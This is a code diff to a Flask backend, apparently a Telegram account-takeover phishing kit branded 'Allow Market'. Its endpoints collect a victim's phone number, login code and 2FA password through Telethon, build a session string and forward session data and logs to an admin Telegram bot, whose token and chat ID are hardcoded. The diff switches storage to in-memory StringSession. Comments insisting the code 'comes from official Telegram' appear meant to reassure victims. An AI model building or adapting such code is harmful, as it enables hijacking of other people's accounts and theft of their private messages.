@@ -1,4 +1,4 @@
-# app.py — ТОЛЬКО TELETHON, ЧИСТЫЙ MTProto
+# app.py — Telethon с StringSession (без файлов)
 # КОД ПРИХОДИТ ОТ ОФИЦИАЛЬНОГО TELEGRAM
 
 from flask import Flask, request, jsonify
@@ -11,6 +11,7 @@ import json
 import io
 from dotenv import load_dotenv
 from telethon import TelegramClient
+from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneNumberInvalidError,
     PhoneCodeInvalidError,
@@ -36,7 +37,7 @@ API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
 ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 
-# Хранилище сессий
+# Хранилище сессий (в памяти)
 sessions = {}
 
 # ============================================================
@@ -92,14 +93,18 @@ def send_tdata_to_admin(session_data):
         print(f"Send tdata error: {e}")
 
 # ============================================================
-# MTProto ФУНКЦИИ (ТОЛЬКО TELETHON)
+# MTProto ФУНКЦИИ (Telethon с StringSession)
 # ============================================================
 
 async def send_code_async(phone):
     """Отправка кода через MTProto (Telethon). Код приходит ОТ TELEGRAM"""
     try:
-        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
-        client = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
+        # Используем StringSession вместо файла
+        client = TelegramClient(
+            StringSession(),
+            api_id=API_ID,
+            api_hash=API_HASH
+        )
         
         await client.connect()
         
@@ -108,12 +113,13 @@ async def send_code_async(phone):
             return {'success': False, 'error': 'Already authorized'}
         
         # ОТПРАВЛЯЕМ ЗАПРОС НА КОД ЧЕРЕЗ MTProto
-        # TELEGRAM САМ ОТПРАВЛЯЕТ КОД ПОЛЬЗОВАТЕЛЮ!
         result = await client.send_code_request(phone)
         
+        # Сохраняем клиент и сессию в памяти
         sessions[phone] = {
             'client': client,
-            'phone_code_hash': result.phone_code_hash
+            'phone_code_hash': result.phone_code_hash,
+            'session_string': None  # будет сохранён после входа
         }
         
         send_admin_log(f"📱 Код запрошен для {phone} (MTProto/Telethon)")
@@ -144,6 +150,7 @@ async def check_code_async(phone, code, phone_code_hash):
                 phone_code_hash=phone_code_hash
             )
             
+            # Получаем строку сессии
             session_string = client.session.save()
             
             session_data = {
@@ -220,8 +227,9 @@ def ping():
     return jsonify({
         'status': 'online',
         'service': 'Allow Market Backend',
-        'version': '13.0.0',
+        'version': '14.0.0',
         'library': 'Telethon (MTProto)',
+        'session': 'StringSession (no files)',
         'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
     })
@@ -301,10 +309,9 @@ def check_password():
         return jsonify({'success': False, 'error': result.get('error')}), 400
 
 if __name__ == '__main__':
-    os.makedirs('sessions', exist_ok=True)
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
+    print("📌 Используется StringSession (без файлов)")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
-    print("📌 Бот используется ТОЛЬКО для логов админу")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
